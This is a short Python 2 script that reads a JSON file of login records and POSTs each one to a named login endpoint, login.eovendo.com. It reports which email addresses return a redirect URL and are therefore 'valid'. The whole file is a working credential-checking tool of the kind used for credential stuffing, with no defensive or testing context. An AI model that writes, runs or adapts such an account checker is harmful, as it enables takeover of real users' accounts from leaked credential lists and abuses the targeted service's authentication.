import json
import urllib
import urllib2
import sys

for login in json.load(open(sys.argv[1])):
  if login['EmailAddress']:
    try:
      # encode the json
      data = urllib.urlencode(login)
      # make the POST request
      # 
      response = urllib2.urlopen('https://login.eovendo.com', data, 10)
      # encode the repsonse in json.
      jr = json.loads(response.read())

      # if we get a returnUrl the account is valid
      if jr['returnUrl']:
        print login['EmailAddress'] + " is valid.."
      else:
        print login['EmailAddress'].encode('utf-8') + ' failed with msg: ' + jr['Message'].encode('utf-8')
    except Exception, e:
      print e
  else:
    print str(login) + " isn't valid"
